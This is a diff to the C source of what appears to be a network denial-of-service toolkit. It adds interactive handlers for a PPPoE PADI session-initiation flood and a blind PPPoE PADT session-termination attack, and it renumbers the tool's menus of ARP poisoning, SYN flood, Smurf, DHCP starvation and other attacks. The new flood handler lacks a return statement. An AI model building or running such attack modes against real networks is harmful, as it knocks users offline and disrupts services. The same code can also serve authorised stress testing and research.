@@ -405,6 +405,78 @@ int
 /* -------------------------------------------------------------------------- */
 
 int
+  hy_assistant_handle_blind_pppoe_ses_ini_flood
+    (
+      hy_attack_t* attack
+    ) {
+
+  /*
+   * USAGE:
+   *   Assistent handler for
+   *   Blind PPPoE session
+   *   initiation flood.
+   */
+
+  int ret = HY_ER_OK;
+
+  attack->type = HY_AT_T_PPPOE_DISCOVER;
+  attack->icmp_pppoe_code = HY_PPPOE_CODE_PADI;
+  strncpy(
+    attack->src_pat.src,
+    "%",
+    HY_PT_BUFLEN);
+  strncpy(
+    attack->dst_pat.src,
+    "ff:ff:ff:ff:ff:ff",
+    HY_PT_BUFLEN);
+} /* hy_assistant_handle_blind_pppoe_ses_ini_flood */
+
+/* -------------------------------------------------------------------------- */
+
+int
+  hy_assistant_handle_blind_pppoe_ses_term
+    (
+      hy_attack_t* attack
+    ) {
+
+  /*
+   * USAGE:
+   *   Assistent handler for
+   *   Blind PPPoE session
+   *   termination attacks.
+   */
+
+  int ret = HY_ER_OK;
+
+  attack->type = HY_AT_T_PPPOE_DISCOVER;
+  attack->icmp_pppoe_code = HY_PPPOE_CODE_PADT;
+  attack->seq_sid = 1;
+  attack->seq_sid_ins = 1;
+  /* Enter PPPoE-Session (A) pattern */
+  ret =
+    hy_assistant_input_address_pattern(
+      "Enter PPPoE-Session (A)",
+      "[HW-Address]",
+      attack->ip_v_asm,
+      attack->src_pat.src,
+      0);
+  if (ret != HY_ER_OK) {
+    return ret;
+  }
+  /* Enter PPPoE-Session (B) pattern */
+  ret =
+    hy_assistant_input_address_pattern(
+      "Enter PPPoE-Session (B)",
+      "[HW-Address]",
+      attack->ip_v_asm,
+      attack->dst_pat.src,
+      0);
+  return ret;
+} /* hy_assistant_handle_blind_pppoe_ses_term */
+
+/* -------------------------------------------------------------------------- */
+
+int
   hy_assistant_handle_icmp_tcp_reset
     (
       hy_attack_t* attack
@@ -420,8 +492,8 @@ int
   int opt = 0;
 
   attack->type = HY_AT_T_ICMP_UNREACH_TCP;
-  attack->tcp_seq = 1;
-  attack->tcp_seq_ins = 1;
+  attack->seq_sid = 1;
+  attack->seq_sid_ins = 1;
   /* Select ICMP "Destination Unreachable" Code */
   if ((ret =
          hy_assistant_input_numeric(
@@ -440,16 +512,16 @@ int
   }
   switch (opt) {
     case 1:
-      attack->icmp_unr_code = ICMP_UNREACH_NET;
+      attack->icmp_pppoe_code = ICMP_UNREACH_NET;
       break;
     case 2:
-      attack->icmp_unr_code = ICMP_UNREACH_HOST;
+      attack->icmp_pppoe_code = ICMP_UNREACH_HOST;
       break;
     case 3:
-      attack->icmp_unr_code = ICMP_UNREACH_PROTO;
+      attack->icmp_pppoe_code = ICMP_UNREACH_PROTO;
       break;
     case 4:
-      attack->icmp_unr_code = ICMP_UNREACH_PORT;
+      attack->icmp_pppoe_code = ICMP_UNREACH_PORT;
       break;
   }
   /* Enter TCP-Connection (A) pattern */
@@ -594,8 +666,8 @@ int
 
   attack->type = HY_AT_T_TCP;
   attack->tcp_flgs = TH_RST;
-  attack->tcp_seq = 1;
-  attack->tcp_seq_ins = 1;
+  attack->seq_sid = 1;
+  attack->seq_sid_ins = 1;
   /* Enter TCP-Connection (A) pattern */
   ret =
     hy_assistant_input_address_pattern(
@@ -1148,18 +1220,20 @@ int
         /* NAT-Free, EAP-Free IPv4 attacks */
         printf("\n  > 1.  ARP-Request flood                  DoS");
         printf("\n  > 2.  ARP-Cache poisoning                MITM");
-        printf("\n  > 3.  ICMPv4-Echo flood                  DoS");
-        printf("\n  > 4.  ICMPv4-Smurf attack                DDoS");
-        printf("\n  > 5.  ICMPv4 based TCP-Connection reset  DoS");
-        printf("\n  > 6.  TCP-SYN flood                      DoS");
-        printf("\n  > 7.  TCP-Land attack                    DoS");
-        printf("\n  > 8.  Blind TCP-Connection reset         DoS");
-        printf("\n  > 9.  UDP flood                          DoS");
-        printf("\n  > 10. DNS-Query flood                    DoS");
-        printf("\n  > 11. DHCP-Discover flood                DoS");
-        printf("\n  > 12. DHCP starvation                    DoS");
-        printf("\n  > 13. DHCP-Release forcing               DoS");
-        max_opt_val = 13;
+        printf("\n  > 3.  PPPoE session initiation flood     DoS");
+        printf("\n  > 4.  Blind PPPoE session termination    DoS");
+        printf("\n  > 5.  ICMPv4-Echo flood                  DoS");
+        printf("\n  > 6.  ICMPv4-Smurf attack                DDoS");
+        printf("\n  > 7.  ICMPv4 based TCP-Connection reset  DoS");
+        printf("\n  > 8.  TCP-SYN flood                      DoS");
+        printf("\n  > 9.  TCP-Land attack                    DoS");
+        printf("\n  > 10. Blind TCP-Connection reset         DoS");
+        printf("\n  > 11. UDP flood                          DoS");
+        printf("\n  > 12. DNS-Query flood                    DoS");
+        printf("\n  > 13. DHCP-Discover flood                DoS");
+        printf("\n  > 14. DHCP starvation                    DoS");
+        printf("\n  > 15. DHCP-Release forcing               DoS");
+        max_opt_val = 15;
       } else {
         /* NAT-Free, None EAP-Free IPv4 attacks */
         printf("\n  > 1.  ARP-Cache poisoning                MITM");
@@ -1176,12 +1250,14 @@ int
       }
     } else {
       /* NAT-Free IPv6 attacks */
-      printf("\n  > 1. ICMPv6-Echo flood                     DoS");
-      printf("\n  > 2. TCP-SYN flood                         DoS");
-      printf("\n  > 3. Blind TCP-Connection reset            DoS");
-      printf("\n  > 4. UDP flood                             DoS");
-      printf("\n  > 5. DNS-Query flood                       DoS");
-      max_opt_val = 5;
+      printf("\n  > 1. PPPoE session initiation flood        DoS");
+      printf("\n  > 2. Blind PPPoE session termination       DoS");
+      printf("\n  > 3. ICMPv6-Echo flood                     DoS");
+      printf("\n  > 4. TCP-SYN flood                         DoS");
+      printf("\n  > 5. Blind TCP-Connection reset            DoS");
+      printf("\n  > 6. UDP flood                             DoS");
+      printf("\n  > 7. DNS-Query flood                       DoS");
+      max_opt_val = 7;
     }
   } else {
     if (attack->ip_v_asm == HY_AD_T_IP_V4) {
@@ -1225,51 +1301,59 @@ int
             break;
           case 3:
             ret =
-              hy_assistant_handle_icmp_echo_flood(
-                attack, nat_free, hw_addr_gateway, 0);
-            break;
+              hy_assistant_handle_blind_pppoe_ses_ini_flood(attack);
+            break;            
           case 4:
             ret =
-              hy_assistant_handle_icmp_echo_flood(
-                attack, nat_free, hw_addr_gateway, 1);
+              hy_assistant_handle_blind_pppoe_ses_term(attack);
             break;
           case 5:
             ret =
-              hy_assistant_handle_icmp_tcp_reset(attack);
+              hy_assistant_handle_icmp_echo_flood(
+                attack, nat_free, hw_addr_gateway, 0);
             break;
           case 6:
+            ret =
+              hy_assistant_handle_icmp_echo_flood(
+                attack, nat_free, hw_addr_gateway, 1);
+            break;
+          case 7:
+            ret =
+              hy_assistant_handle_icmp_tcp_reset(attack);
+            break;
+          case 8:
             ret =
               hy_assistant_handle_tcp_syn_flood(
                 attack, nat_free, hw_addr_gateway, 0);
             break;
-          case 7:
+          case 9:
             ret =
               hy_assistant_handle_tcp_syn_flood(
                 attack, nat_free, hw_addr_gateway, 1);
             break;
-          case 8:
+          case 10:
             ret =
               hy_assistant_handle_blind_tcp_reset(attack);
             break;
-          case 9:
+          case 11:
             ret =
               hy_assistant_handle_udp_flood(
                 attack, nat_free, hw_addr_gateway);
             break;
-          case 10:
+          case 12:
             ret =
               hy_assistant_handle_dns_query_flood(
                 attack, nat_free, hw_addr_gateway, 1);
             break;
-          case 11:
+          case 13:
             ret =
               hy_assistant_handle_dhcp_discover_flood(attack);
             break;
-          case 12:
+          case 14:
             ret =
               hy_assistant_handle_dhcp_starvation(attack);
             break;
-          case 13:
+          case 15:
             ret =
               hy_assistant_handle_dhcp_release_forcing(attack);
             break;
@@ -1330,24 +1414,32 @@ int
       switch (opt) {
         case 1:
           ret =
+            hy_assistant_handle_blind_pppoe_ses_ini_flood(attack);
+          break; 
+        case 2:
+          ret =
+            hy_assistant_handle_blind_pppoe_ses_term(attack);
+          break;
+        case 3:
+          ret =
             hy_assistant_handle_icmp_echo_flood(
               attack, nat_free, hw_addr_gateway, 0);
           break;
-        case 2:
+        case 4:
           ret =
             hy_assistant_handle_tcp_syn_flood(
               attack, nat_free, hw_addr_gateway, 0);
           break;
-        case 3:
+        case 5:
           ret =
             hy_assistant_handle_blind_tcp_reset(attack);
           break;
-        case 4:
+        case 6:
           ret =
             hy_assistant_handle_udp_flood(
               attack, nat_free, hw_addr_gateway);
           break;
-        case 5:
+        case 7:
           ret =
             hy_assistant_handle_dns_query_flood(
               attack, nat_free, hw_addr_gateway, 0);
@@ -1441,21 +1533,32 @@ int
   printf(
     " -a %s",
     hy_get_attack_name(attack->type));
-  if (attack->icmp_unr_code > 0) {
+  if (attack->icmp_pppoe_code > 0) {
     printf(" -o ");
-    switch (attack->icmp_unr_code) {
-      case ICMP_UNREACH_NET:
-        printf("network");
-        break;
-      case ICMP_UNREACH_HOST:
-        printf("host");
-        break;
-      case ICMP_UNREACH_PROTO:
-        printf("protocol");
-        break;
-      case ICMP_UNREACH_PORT:
-        printf("port");
-        break;
+    if (attack->type == HY_AT_T_PPPOE_DISCOVER) {
+      switch (attack->icmp_pppoe_code) {
+        case HY_PPPOE_CODE_PADI:
+          printf("padi");
+          break;
+        case HY_PPPOE_CODE_PADT:
+          printf("padt");
+          break;
+      }
+    } else {
+      switch (attack->icmp_pppoe_code) {
+        case ICMP_UNREACH_NET:
+          printf("network");
+          break;
+        case ICMP_UNREACH_HOST:
+          printf("host");
+          break;
+        case ICMP_UNREACH_PROTO:
+          printf("protocol");
+          break;
+        case ICMP_UNREACH_PORT:
+          printf("port");
+          break;
+      }
     }
   }
   if (attack->type == HY_AT_T_TCP) {
@@ -1476,11 +1579,11 @@ int
       printf("a");
     }
   }
-  if (attack->tcp_seq > 0) {
-    printf(" -q %i", attack->tcp_seq);
+  if (attack->seq_sid > 0) {
+    printf(" -q %i", attack->seq_sid);
   }
-  if (attack->tcp_seq_ins > 0) {
-    printf(" -Q %i", attack->tcp_seq_ins);
+  if (attack->seq_sid_ins > 0) {
+    printf(" -Q %i", attack->seq_sid_ins);
   }
   if (attack->type == HY_AT_T_UDP) {
     printf(" -p %i",attack->pay_len);
